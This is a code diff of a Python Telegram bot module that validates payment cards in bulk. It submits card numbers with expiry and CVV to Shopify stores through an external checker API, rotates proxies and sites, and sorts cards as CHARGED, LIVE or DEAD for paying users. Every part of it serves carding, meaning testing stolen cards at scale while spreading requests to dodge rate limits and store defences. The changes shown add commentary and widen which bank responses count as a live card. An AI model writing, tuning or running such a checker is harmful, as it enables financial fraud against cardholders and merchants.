@@ -60,8 +60,6 @@ from typing import Optional
 import aiohttp
 from telegram import Update, InputFile, MessageEntity
 from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
-# Added imports for error handling to prevent skipped DMs during mass checks
-from telegram.error import BadRequest, Forbidden, NetworkError, RetryAfter, TimedOut
 
 from config import (
     OWNER_ID,
@@ -92,6 +90,15 @@ LOGS_CHANNEL_LINK   = "https://t.me/+XYnHim3rGsw0Yzdk"             # hits log ch
 SH_COOLDOWN    = 25
 
 # ── Speed / concurrency settings ───────────────────────────────────────────
+# lucifer.up.railway.app is a shared Railway app — it can't handle hundreds of
+# simultaneous connections.  Too many concurrent calls → 502/503 errors →
+# real bank responses (PCI_ERROR, GENERIC_ERROR, etc.) never arrive →
+# cards falsely marked DEAD.
+#
+# Safe values that keep the API healthy:
+#   SITE_BATCH=1      → one site attempt at a time per card (no racing)
+#   MAX_CONCURRENT=25  → max 8 cards in parallel during /msh
+#   API_CONCURRENCY=20→ global hard cap on simultaneous API calls (all users)
 SITE_RETRIES       = 20   # max site attempts per card (was 80 — overkill)
 SITE_TIMEOUT       = 30   # seconds per API call — generous for slow Railway
 MAX_CONCURRENT     = 25    # cards in parallel during /msh  (was 50)
@@ -111,6 +118,22 @@ _DEAD_SITES:  set   = set()
 _ALL_PROXIES: list  = []
 
 # ── Disk-IO TTL caches ─────────────────────────────────────────────────────
+# _load_proxies() and _load_sites() read files from disk.
+# For 1000 concurrent users each calling /sh, re-reading the file every time
+# would serialize 1000 blocking disk reads on the event loop.
+# These TTL caches ensure disk is only touched once per interval — every
+# subsequent call returns the in-memory copy instantly (no I/O, no blocking).
+# Global API rate-limiter — created lazily on first use (asyncio.Semaphore
+# must be created inside a running event loop, not at import time).
+_API_SEM: "asyncio.Semaphore | None" = None
+
+def _get_api_sem() -> "asyncio.Semaphore":
+    """Return (creating if needed) the global API concurrency semaphore."""
+    global _API_SEM
+    if _API_SEM is None:
+        _API_SEM = asyncio.Semaphore(API_CONCURRENCY)
+    return _API_SEM
+
 _PROXY_CACHE_TS:  float = 0.0
 _PROXY_CACHE_TTL: float = 300.0   # refresh proxies from disk every 5 minutes
 
@@ -122,51 +145,51 @@ _SITES_RAW_TTL:   float = 300.0   # refresh sites from disk every 5 minutes
 _WORKING_SITES:     list  = []
 _PROBE_IN_PROGRESS: bool  = False
 _PROBE_LAST_RUN:    float = 0.0
-_PROBE_TASK:        "asyncio.Task | None" = None
+_PROBE_TASK:        "asyncio.Task | None" = None   # stored so shutdown can cancel it
 PROBE_TTL:          float = 1800.0   # re-probe every 30 min
 PROBE_CARD:         str   = "4000223372377978|05|29|651"   # same test card as sitechk.py
 PROBE_TIMEOUT:      float = 20.0
 PROBE_CONCURRENCY:  int   = 60
 
-# Global API rate-limiter
-_API_SEM: "asyncio.Semaphore | None" = None
-
-def _get_api_sem() -> "asyncio.Semaphore":
-    global _API_SEM
-    if _API_SEM is None:
-        _API_SEM = asyncio.Semaphore(API_CONCURRENCY)
-    return _API_SEM
-
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# EMOJI IDS
+# EMOJI IDS  — full set from mst.py (custom premium stickers)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Core card/user/time emojis
 CARD_EMOJI_ID     = "5800709991627232190"
 USER_EMOJI_ID     = "6267115986541877538"
 TIME_EMOJI_ID     = "6285240160120477644"
 DEV_EMOJI_ID      = "6267091732861555879"
 PRO_EMOJI_ID      = "6280484433027931563"
+
+# Status emojis
 DECLINED_EMOJI_ID = "4956612582816351459"
 
+# Hit-log emojis
 HIT_GATE_EMOJI_ID = "5341715473882955310"
 HIT_RESP_EMOJI_ID = "5839116473951328489"
 
+# Progress-message emojis  (/msh mass checker — unchanged)
 PROG_GATE_EMOJI_ID     = "5370935802844946281"
 PROG_PROGRESS_EMOJI_ID = "5116268964023894989"
 PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
-PROG_LIVE_EMOJI_ID     = "6296367896398399651"
+PROG_LIVE_EMOJI_ID     = "6296367896398399651"   # custom live emoji
 PROG_DEAD_EMOJI_ID     = "4958526153955476488"
 PROG_ERRORS_EMOJI_ID   = "4956611513369494230"
 
-SH_GATE_EMOJI_ID = "6220029508456548253"
-SH_PROG_EMOJI_ID = "6298691319086712919"
-SH_LIVE_EMOJI_ID = "6296367896398399651"
+# /sh single-checker spinner — custom premium emoji IDs (user-defined)
+SH_GATE_EMOJI_ID = "6220029508456548253"   # ❤️  gate line
+SH_PROG_EMOJI_ID = "6298691319086712919"   # 😄  progress line
+SH_LIVE_EMOJI_ID = "6296367896398399651"   # 🎸  live count
 
-BTN_CHARGED_EMOJI_ID  = "5465465194056525619"
-BTN_LIVE_EMOJI_ID     = "5039793437776282663"
-BTN_ALL_EMOJI_ID      = "4956324463525233747"
-BTN_STOP_EMOJI_ID     = "6179444193518162239"
-CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"
+# Button emojis
+BTN_CHARGED_EMOJI_ID  = "5465465194056525619"   # 💎 charged button
+BTN_LIVE_EMOJI_ID     = "5039793437776282663"   # ✅ live button
+BTN_ALL_EMOJI_ID      = "4956324463525233747"   # 📁 all button
+BTN_STOP_EMOJI_ID     = "6179444193518162239"   # ⛔ stop button
+CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"   # 💳 hit-log group inline button
 
+# Pool of 18 premium animated emojis — used for CHARGED and LIVE hits (random per card)
 CHARGED_EMOJI_IDS = [
     "5801154993188770160", "4956739572114392015", "5285221724634239278",
     "5287777298894835685", "5285024405246725814", "5287547831677112267",
@@ -176,10 +199,12 @@ CHARGED_EMOJI_IDS = [
     "5891044423856296980", "5436068999068662274", "5427168083074628963",
 ]
 
+# LIVE_EMOJI_IDS — separate pool for LIVE hits using the user's custom premium emoji
 LIVE_EMOJI_IDS = [
     "6296367896398399651",
 ]
 
+# Plan emojis (CORE / ELITE / ROOT / CUSTOM)
 PLAN_EMOJIS = {
     "CORE":   "5379869575338812919",
     "ELITE":  "5836898273666798437",
@@ -187,6 +212,7 @@ PLAN_EMOJIS = {
     "CUSTOM": "5445027583588593750",
 }
 
+# Small-caps → uppercase map for plan name normalisation
 SPECIAL_FONT_MAP = {
     'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
     'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
@@ -196,24 +222,43 @@ SPECIAL_FONT_MAP = {
     'ᴢ': 'Z', 'Ɪ': 'I',
 }
 
+
 def get_random_charged_emoji() -> str:
+    """Random premium emoji for CHARGED hits."""
     return random.choice(CHARGED_EMOJI_IDS)
 
+
 def get_random_live_emoji() -> str:
+    """Random premium emoji for LIVE / TDS hits — same pool as mst.py."""
     return random.choice(LIVE_EMOJI_IDS)
 
+
 def get_plan_emoji_id(plan_name: str) -> str:
-    if not plan_name: return PRO_EMOJI_ID
+    """Return the premium plan emoji ID for a given plan name."""
+    if not plan_name:
+        return PRO_EMOJI_ID
     norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
-    if norm in PLAN_EMOJIS: return PLAN_EMOJIS[norm]
+    if norm in PLAN_EMOJIS:
+        return PLAN_EMOJIS[norm]
     for k, v in PLAN_EMOJIS.items():
-        if k in norm: return v
+        if k in norm:
+            return v
     return PRO_EMOJI_ID
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# RESPONSE CLASSIFICATION
+# RESPONSE CLASSIFICATION  — exact match to msh.py logic
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# RETRY_ERRORS — site / infrastructure errors
+# These mean the Shopify SITE is broken, not that the card failed.
+# The retry loop discards this site and tries another.
+#
+# ⚠  NEVER add single common words like 'failed', 'item', 'resolve' here.
+#    Substring matching means 'failed' would eat bank responses that contain
+#    "failed" (e.g. "AUTHENTICATION_FAILED") and turn real LIVE cards into
+#    endless RETRY loops.  Only add specific, unambiguous strings.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 RETRY_ERRORS = [
+    # ── Token / checkout pipeline failures ─────────────────────────────────
     'r4 token empty', 'r2 id empty', 'clinte token',
     'failed to get token', 'token not found', 'failed to get checkout',
     'failed to get session token', 'failed to add to cart',
@@ -228,18 +273,26 @@ RETRY_ERRORS = [
     'could not find actions js url',
     'missing stableid', 'missing buildid', 'missing sourcetoken',
     'missing proposal', 'missing submit id',
+
+    # ── Site not usable ─────────────────────────────────────────────────────
     'payment method is not shopify!', 'not shopify!',
     'site not supported for now!', 'site not supported',
     'site requires login!', 'site overloaded', 'site rate limited',
     'application not found', 'store not found', 'app not found',
     'store incompatible', 'errstoreincompatible',
+
+    # ── Product / inventory problems ────────────────────────────────────────
     'product not found', 'product id is empty', 'py id empty',
     'no valid products', 'no available products found',
     'NO_PRODUCTS', 'NO_PRODUCT', 'no_products',
     'MERCHANDISE_OUT_OF_STOCK', 'products.json',
     'INVENTORY_FAILURE', 'inventory_failure',
     'retryable: inventory reservation failure',
+
+    # ── Security / captcha ──────────────────────────────────────────────────
     'hcaptcha detected', 'hcaptcha_detected',
+
+    # ── Delivery / shipping pipeline ────────────────────────────────────────
     'DELIVERY_ZONE_NOT_FOUND', 'delivery_zone_not_found',
     'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
     'delivery_no_delivery_strategy_available',
@@ -251,10 +304,16 @@ RETRY_ERRORS = [
     'delivery_strategy_conditions_not_satisfied',
     'DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION',
     'delivery_out_of_stock_at_origin_location',
+
+    # ── Session / validation errors ─────────────────────────────────────────
     'SESSION_ERROR', 'session_error', 'receipt_empty',
     'invalid_response', 'checkout_failed', 'VALIDATION_CUSTOM', 'validation_custom',
     'VAULT_FAILED', 'exceeded 30 poll attempts',
+
+    # ── Tax / amount pipeline ───────────────────────────────────────────────
     'tax ammount empty', 'del ammount empty',
+
+    # ── HTTP-level site errors (from the checker API) ───────────────────────
     'site error! status: 401', 'site error! status: 402',
     'site error! status: 403', 'site error! status: 404',
     'site error! status: 429',
@@ -263,14 +322,20 @@ RETRY_ERRORS = [
     'site error',
     'returned status 429', 'returned status 500',
     'returned status 502', 'returned status 503', 'returned status 504',
+
+    # ── Network / proxy errors ──────────────────────────────────────────────
     'connection error', 'connection error!',
     'could not resolve host', 'connect tunnel failed',
     'proxy error', 'curl error', 'http error',
     'timeout',
+
+    # ── Checkout step failures (specific — not just "failed") ───────────────
     'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
     'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
     'step 8 failed', 'step 9 failed', 'step 10 failed',
     'error processing card',
+
+    # ── Gateway / buyer identity issues ─────────────────────────────────────
     'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
     'payments_credit_card_brand_not_supported',
     'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
@@ -279,6 +344,9 @@ RETRY_ERRORS = [
     'unable to get payment token',
 ]
 
+# DECLINED_RESPONSES = confirmed bank hard-declines → card is genuinely bad
+# ⚠  Do NOT add CALL_ISSUER here — it means "call your bank", which implies
+#    the card exists and is valid.  It is classified as LIVE in classify_response.
 DECLINED_RESPONSES = [
     'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
     'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
@@ -289,10 +357,17 @@ DECLINED_RESPONSES = [
     'TRANSACTION_NOT_ALLOWED',
 ]
 
+# Keep old names as aliases so probe functions still work
 DEAD_ERRORS     = RETRY_ERRORS
 SUCCESS_RESPONSES = [
+    # ── Confirmed LIVE (card hit the bank, soft/ambiguous decline) ──────────
     'INSUFFICIENT_FUNDS', 'INCORRECT_CVV', 'INCORRECT_CVC', 'INCORRECT_ZIP',
-    'INVALID_CVC', '3DS_REQUIRED', 'ORDER_PAID',
+    'INVALID_CVC',
+    # ── TDS (3-D Secure required) ────────────────────────────────────────────
+    '3DS_REQUIRED',
+    # ── Charged ──────────────────────────────────────────────────────────────
+    'ORDER_PAID',
+    # ── Bank hard-declines (card reached bank but was rejected) ──────────────
     'CARD_DECLINED', 'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR', 
     'UNKNOWN_ERROR', 'Processing Error', 'PROCESSING_ERROR', 'GENERIC_ERROR',
     'EXPIRED_CARD', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
@@ -301,25 +376,34 @@ SUCCESS_RESPONSES = [
     'STOLEN_CARD', 'LOST_CARD', 'TRANSACTION_NOT_ALLOWED',
 ]
 
+
 def _is_dead_site_response(resp: str) -> bool:
+    """True if the response is a site/infrastructure error (should retry another site)."""
     r = resp.lower().strip()
     return any(err.lower() in r for err in RETRY_ERRORS)
 
+
 def _is_success_response(resp: str) -> bool:
+    """True if the response is a real bank response (site is alive)."""
     ru = resp.upper().strip()
     return any(s.upper() in ru for s in SUCCESS_RESPONSES)
+
 
 def classify_response(resp: str) -> str:
     """
     Classify a response string from lucifer.up.railway.app.
-    Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | RECHECK
+    Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR
 
       CHARGED / TDS / LIVE / DEAD  →  final verdict, stop checking this card
-      RETRY                        →  site/infra problem, try a different site
-      RECHECK                      →  ambiguous response, recheck on another site immediately
+      RETRY / ERROR                →  site/infra problem, try a different site
 
     Note: _parse_response_field() already converts Status=true → "ORDER_PAID"
     before this function is called, so every charged card arrives as ORDER_PAID.
+
+    GENERIC_ERROR classification:
+      The API returns GENERIC_ERROR when the bank gave an ambiguous response —
+      the charge was submitted and the bank replied, but the outcome is unclear.
+      This means the card IS valid (it hit a real bank).  → LIVE, not DEAD.
     """
     if not resp:
         return "RETRY"
@@ -342,9 +426,32 @@ def classify_response(resp: str) -> str:
         return "LIVE"
 
     # ── LIVE (card reached the bank — soft / ambiguous decline) ─────────────
-    # Only Insufficient Funds and Generic Error are kept as LIVE immediately.
+    # Every response here means the card was submitted to the bank and the
+    # bank (or Shopify fraud engine) gave a real reply — card is valid/live.
     if ("INSUFFICIENT_FUNDS"       in mu
-            or "GENERIC_ERROR"         in mu):
+            or "INCORRECT_CVV"         in mu
+            or "INCORRECT_CVC"         in mu
+            or "INCORRECT_ZIP"         in mu
+            or "INVALID_CVC"           in mu
+            or "INVALID_CVV"           in mu
+            or "PCI_ERROR"             in mu    # PCI compliance filter — card is LIVE
+            or "CVV_FAILED"            in mu
+            or "AVS_FAILED"            in mu
+            or "RISK_BLOCKED"          in mu
+            or "SECURITY_VIOLATION"    in mu
+            or "CALL_ISSUER"           in mu
+            or "GENERIC_ERROR"         in mu    # ambiguous bank response — card is LIVE
+            # ── Shopify-native security / fingerprint strings ────────────────
+            or "TRANSFORMER_FINGERPRINT" in mu  # Shopify bot-detection fingerprint
+            or "FINGERPRINT"           in mu
+            or "PCI"                   in mu    # any PCI-related string
+            or ("ARTIFACT" in mu and "SELLER" in mu)  # Shopify checkout artifact
+            or "COMPLIANCE"            in mu
+            or "CVV2"                  in mu
+            or "AVS"                   in mu
+            or "RISK"                  in mu
+            or "VELOCITY"              in mu    # velocity check = card was processed
+            ):
         return "LIVE"
 
     # ── DEAD (confirmed bank hard-decline — card is bad) ─────────────────────
@@ -352,12 +459,18 @@ def classify_response(resp: str) -> str:
         return "DEAD"
 
     # ── RETRY (site/infra error — skip to a different Shopify site) ──────────
+    # Uses exact substring matching against specific strings only.
+    # Never put single common words ('failed', 'item', etc.) in RETRY_ERRORS.
     if any(r.lower() in ml for r in RETRY_ERRORS):
         return "RETRY"
 
-    # ── RECHECK (other responses that might be Live, but need rechecking) ───
-    # Any other response (PCI Error, Delivery Error, etc.) should be rechecked.
-    return "RECHECK"
+    # ── Unknown response → LIVE ───────────────────────────────────────────────
+    # Anything reaching here is NOT a site error and NOT a confirmed hard-decline.
+    # The bank/Shopify replied with something unrecognised — card is real → LIVE.
+    return "LIVE"
+
+
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # LOADERS
@@ -368,10 +481,18 @@ def _strip_proxy_scheme(p: str) -> str:
             return p[len(pfx):]
     return p
 
+
 def _load_proxies() -> list:
+    """Load proxies from disk with a 5-minute TTL cache.
+
+    For 1000 concurrent /sh calls this means ONE disk read per 5 minutes
+    instead of 1000 blocking disk reads — all subsequent callers get the
+    in-memory list instantly with zero I/O.
+    """
     global _ALL_PROXIES, _PROXY_CACHE_TS
     import os
     now = time.time()
+    # Return cached result if it is still fresh
     if _ALL_PROXIES and (now - _PROXY_CACHE_TS) < _PROXY_CACHE_TTL:
         return list(_ALL_PROXIES)
 
@@ -392,8 +513,9 @@ def _load_proxies() -> list:
                 pass
     logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
     _ALL_PROXIES    = []
-    _PROXY_CACHE_TS = time.time()
+    _PROXY_CACHE_TS = time.time()   # cache the "empty" result too
     return []
+
 
 def _strip_scheme(url: str) -> str:
     url = url.strip()
@@ -402,10 +524,22 @@ def _strip_scheme(url: str) -> str:
             url = url[len(pfx):]
     return url.rstrip("/")
 
+
 def _load_sites() -> list:
+    """Load sites from sites.txt with a 5-minute TTL cache.
+
+    Returns a FRESH SHUFFLED copy each call so every card gets a different
+    site-rotation order — the shuffle is done on the cached list, not on
+    disk, so no I/O happens after the first successful read within the TTL.
+    For 1000 concurrent /sh calls this means ONE disk read per 5 min.
+
+    Raises RuntimeError if the file is missing or empty so the problem
+    is immediately visible instead of silently checking nothing.
+    """
     global _SITES_RAW_CACHE, _SITES_RAW_TS
     import os
     now = time.time()
+    # Return shuffled copy of cached list if still fresh
     if _SITES_RAW_CACHE and (now - _SITES_RAW_TS) < _SITES_RAW_TTL:
         result = list(_SITES_RAW_CACHE)
         random.shuffle(result)
@@ -432,9 +566,17 @@ def _load_sites() -> list:
     )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SITE PROBER
+# SITE PROBER  — finds which sites the API actually supports
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _probe_one_site(site: str, proxies: list) -> bool:
+    """
+    Return True if this site is alive and usable for real card checks.
+    Uses the same criteria as sitechk.py:
+      1. Gateway must be "SHOPIFY PAYMENTS"
+      2. Response must be in SUCCESS_RESPONSES (real bank decline)
+      3. Price must be $0.50–$6.00  (too low = store blocks test; too high = risky)
+      4. ORDER_PAID on probe card = block (don't want accidental charges)
+    """
     MAX_PROBE_RETRIES = 3
     for attempt in range(MAX_PROBE_RETRIES):
         px = random.choice(proxies) if proxies else None
@@ -446,20 +588,28 @@ async def _probe_one_site(site: str, proxies: list) -> bool:
             await asyncio.sleep(0.3)
             continue
 
+        # HTTP errors → dead
         if http_st and http_st not in (200,):
             return False
+
+        # Gateway MUST be Shopify Payments
         if gw.upper().strip() != "SHOPIFY PAYMENTS":
             return False
 
         resp_upper = resp.upper().strip()
 
+        # ORDER_PAID on probe card = site actually charged test card → block
         if "ORDER_PAID" in resp_upper or resp_upper == "PAID":
             logging.warning(f"[PROBE] BLOCKED {site}: ORDER_PAID on test card")
             return False
+
+        # Dead-site error → this site is broken, try again with different proxy
         if _is_dead_site_response(resp):
             await asyncio.sleep(0.3)
             continue
 
+        # Real bank response → site is alive!
+        # Price constraint: reject only absurd amounts (>$20) to avoid accidental charges
         if _is_success_response(resp):
             try:
                 p = float(re.sub(r"[^\d.]", "", str(price)))
@@ -467,16 +617,27 @@ async def _probe_one_site(site: str, proxies: list) -> bool:
                     logging.debug(f"[PROBE] ❌ {site} price ${p:.2f} too high, blocked")
                     return False
             except Exception:
-                pass
+                pass  # Can't parse price — accept anyway
             logging.info(f"[PROBE] ✅ {site} alive: {resp!r} price={price}")
             return True
 
+        # Unknown response → try another attempt
         await asyncio.sleep(0.2)
         continue
 
     return False
 
-async def probe_all_sites(all_sites: list, proxies: list, on_progress=None) -> list:
+
+async def probe_all_sites(all_sites: list, proxies: list,
+                          on_progress=None) -> list:
+    """
+    Test every site concurrently. Returns confirmed-working sites.
+    Falls back to all_sites if nothing is alive.
+    on_progress(done, total) is called every 50 sites if provided.
+
+    Safe to cancel: all inner tasks are cancelled first so no
+    asyncio.Semaphore waiter is left trying to wake up on a closed loop.
+    """
     global _WORKING_SITES, _PROBE_IN_PROGRESS, _PROBE_LAST_RUN
 
     if _PROBE_IN_PROGRESS:
@@ -512,14 +673,16 @@ async def probe_all_sites(all_sites: list, proxies: list, on_progress=None) -> l
                     except Exception:
                         pass
         except asyncio.CancelledError:
-            raise
+            raise          # let gather handle it
         except RuntimeError:
-            pass
+            pass           # event loop closed mid-release — exit silently
 
     try:
         tasks = [asyncio.ensure_future(_check_one(s)) for s in all_sites]
         await asyncio.gather(*tasks, return_exceptions=True)
     except asyncio.CancelledError:
+        # Cancel every live probe task so their semaphore waiters never run
+        # on a loop that's already shutting down.
         for t in tasks:
             t.cancel()
         await asyncio.gather(*tasks, return_exceptions=True)
@@ -540,12 +703,18 @@ async def probe_all_sites(all_sites: list, proxies: list, on_progress=None) -> l
 
     return _WORKING_SITES
 
+
 def get_working_sites() -> list:
+    """Return probed working sites, or the full list if probe hasn't run."""
     return list(_WORKING_SITES) if _WORKING_SITES else _load_sites()
 
+
 async def _auto_probe_loop(all_sites: list, proxies: list):
+    """Background loop: probe now, then re-probe every PROBE_TTL seconds.
+    Exits cleanly on CancelledError so the event loop can close without
+    leaving semaphore waiters dangling on a dead loop."""
     try:
-        await asyncio.sleep(5)
+        await asyncio.sleep(5)      # let bot finish startup first
     except asyncio.CancelledError:
         return
     while True:
@@ -562,9 +731,13 @@ async def _auto_probe_loop(all_sites: list, proxies: list):
             logging.info("[PROBE] background sleep cancelled — shutting down")
             return
 
+
 def start_probe_background(all_sites: list, proxies: list) -> None:
+    """Schedule the background probe loop. Call once from _post_init.
+    Stores the task so stop_probe_background() can cancel it on shutdown."""
     global _PROBE_TASK
     _PROBE_TASK = asyncio.ensure_future(_auto_probe_loop(all_sites, proxies))
+    # Log unexpected task failures (CancelledError is expected on shutdown)
     def _on_done(t: asyncio.Task):
         if not t.cancelled():
             exc = t.exception()
@@ -572,7 +745,11 @@ def start_probe_background(all_sites: list, proxies: list) -> None:
                 logging.error(f"[PROBE] background task died: {exc}")
     _PROBE_TASK.add_done_callback(_on_done)
 
+
 async def stop_probe_background() -> None:
+    """Cancel the background probe loop and wait for it to finish.
+    Call from the PTB post_shutdown hook so all semaphore waiters are
+    torn down before the event loop closes."""
     global _PROBE_TASK
     task = _PROBE_TASK
     if task is None or task.done():
@@ -584,6 +761,7 @@ async def stop_probe_background() -> None:
         pass
     _PROBE_TASK = None
     logging.info("[PROBE] background prober stopped cleanly")
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CARD UTILITIES
@@ -600,6 +778,7 @@ def luhn_check(n: str) -> bool:
         t += d
     return t % 10 == 0
 
+
 def is_expired(mm: str, yy: str) -> bool:
     try:
         now = datetime.now()
@@ -609,6 +788,7 @@ def is_expired(mm: str, yy: str) -> bool:
         return False
     except ValueError:
         return True
+
 
 def extract_cards(text: str) -> list:
     patterns = [
@@ -626,42 +806,101 @@ def extract_cards(text: str) -> list:
                 seen.add(s); results.append(s)
     return results
 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # API CALL
+# f-string URL keeps | chars unencoded (aiohttp params= encodes them)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _parse_response_field(data: dict) -> str:
+    """Extract the human-readable response string from the API JSON.
+
+    lucifer.up.railway.app returns:
+      {"Status": true/false, "Response": "ORDER_PAID"|"CARD_DECLINED"|...,
+       "Gateway": "shopify_payments", "Price": "0.98", "Currency": "USD", ...}
+
+    CRITICAL: Status is authoritative.
+      Status=true  → card was CHARGED regardless of what Response says → "ORDER_PAID"
+      Status=false → use the Response string to classify LIVE / DEAD / RETRY
+    """
+    # ── Status=true → charged, full stop ──────────────────────────────────
     if data.get("Status") is True:
         return "ORDER_PAID"
+
+    # ── Status=false → read the Response field ────────────────────────────
     for key in ("Response", "response", "message", "Message",
                 "result", "Result", "msg"):
         val = data.get(key)
         if val and isinstance(val, str) and val.strip():
             resp = val.strip()
+            # "ERROR" from the API = infrastructure / unknown → RETRY
             if resp.upper() == "ERROR":
                 return "site error! status: 500"
             return resp
+
+    # ── No Response field + Status=false → hard decline ──────────────────
     for key in ("error", "Error"):
         val = data.get(key)
         if val and isinstance(val, str) and val.strip():
             return val.strip()
+
     return "CARD_DECLINED"
 
+
 def _proxy_url(proxy: Optional[str]) -> Optional[str]:
-    if not proxy: return None
+    """Ensure proxy has http:// prefix as required by the API."""
+    if not proxy:
+        return None
     p = proxy.strip()
     if p.startswith(("http://", "https://", "socks5://", "socks4://")):
         return p
     return f"http://{p}"
 
+
 def _normalise_gateway(raw: str) -> str:
+    """Normalise gateway name so probe and result code both see the same string.
+
+    API returns "shopify_payments" (lowercase, underscore).
+    Internal code (sitechk, classify) compares against "SHOPIFY PAYMENTS".
+    """
     cleaned = raw.replace("_", " ").replace("-", " ").strip().upper()
-    return cleaned
+    return cleaned   # → "SHOPIFY PAYMENTS"
+
 
 async def _call_api(card: str, site: str, proxy: Optional[str],
                     timeout: float = SITE_TIMEOUT) -> tuple:
-    site_clean = _strip_scheme(site)
+    """Call the lucifer.up.railway.app checker API.
+
+    Endpoint : https://lucifer.up.railway.app/shopii
+    Method   : GET
+    Params   :
+        cc    = CARDNUM|MM|YY|CVV   (pipe-separated, all in one param)
+        site  = domain.myshopify.com (no https:// prefix)
+        proxy = http://ip:port       (optional)
+
+    Response JSON:
+        {"CC":..., "Currency":"USD", "Gateway":"shopify_payments",
+         "Price":"0.98", "Proxy":"None", "Response":"CARD_DECLINED",
+         "Status": false}
+
+    Status is authoritative:
+        true  → ORDER_PAID  (CHARGED)
+        false → use Response string (LIVE / DEAD / RETRY)
+
+    Rate limiting:
+        _get_api_sem() caps simultaneous calls across ALL users to
+        API_CONCURRENCY.  Without this, 1000 users × SITE_BATCH would
+        send hundreds of simultaneous requests to Railway and trigger
+        502/503 responses — hiding real bank results (PCI_ERROR, etc.).
+    """
+    site_clean = _strip_scheme(site)      # drop any https:// prefix
+    # New API (lucifer.up.railway.app) loads proxies from px.txt server-side
+    # automatically — no &proxy= param needed or accepted.
     url = f"{API_URL}?cc={card}&site={site_clean}"
 
+    # Per-user concurrency is controlled by the asyncio.Semaphore(25) in
+    # run_mass_batch — each user independently gets 25 concurrent slots.
+    # No global semaphore here so one user's 25 slots don't eat into another's.
+    # connect=5 → hung proxies fail fast; sock_read=timeout → slow Railway OK
     _to = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
     try:
         async with aiohttp.ClientSession(timeout=_to) as session:
@@ -669,6 +908,7 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
                 http_st = r.status
                 raw     = await r.text()
 
+                # Empty body = API couldn't reach the store
                 if not raw or not raw.strip():
                     return ("site error! status: 404",
                             "Shopify Payments", "0.00", "USD", http_st)
@@ -690,6 +930,7 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
                                  f"→ {api_resp!r}  gw={gw}  price={price} {currency}")
                     return api_resp, gw, price, currency, http_st
 
+                # Non-200 HTTP from the API server itself
                 _emap = {
                     404: "site error! status: 404",
                     403: "site error! status: 403",
@@ -709,6 +950,7 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
     except Exception as e:
         return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CORE RETRY LOOP
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -721,6 +963,20 @@ async def _check_card_with_retry(
     site_timeout: float = SITE_TIMEOUT,
     sid: str            = "",
 ) -> tuple:
+    """
+    Try up to max_sites Shopify stores for this card.
+
+    Sites are raced SITE_BATCH at a time — the first definitive bank
+    response (CHARGED / TDS / LIVE / DEAD) wins and all other in-flight
+    requests are cancelled.  This cuts worst-case time from
+    max_sites × timeout  to  ceil(max_sites/SITE_BATCH) × timeout.
+
+    Early-exit: if CONSEC_TIMEOUT_MAX consecutive attempts all time out
+    the proxies are clearly dead — return DEAD immediately rather than
+    grinding through every remaining site.
+
+    Returns: (verdict, raw_resp, price, currency)
+    """
     if not sites:
         sites = get_working_sites()
         if not sites:
@@ -734,10 +990,12 @@ async def _check_card_with_retry(
     price, currency  = "0.00", "USD"
     last_resp        = "No sites responded"
     consec_timeouts  = 0
-    consec_api_errs  = 0
-    attempt          = 0
+    consec_api_errs  = 0    # consecutive API-server 502/503/504 — detects dead API
+    attempt          = 0    # total slots consumed
 
+    # ── helpers ───────────────────────────────────────────────────────
     async def _try_one(site: str, proxy: Optional[str]):
+        """Wrap _call_api so exceptions become an error-tuple instead of raising."""
         try:
             return site, await _call_api(card, site, proxy, timeout=site_timeout)
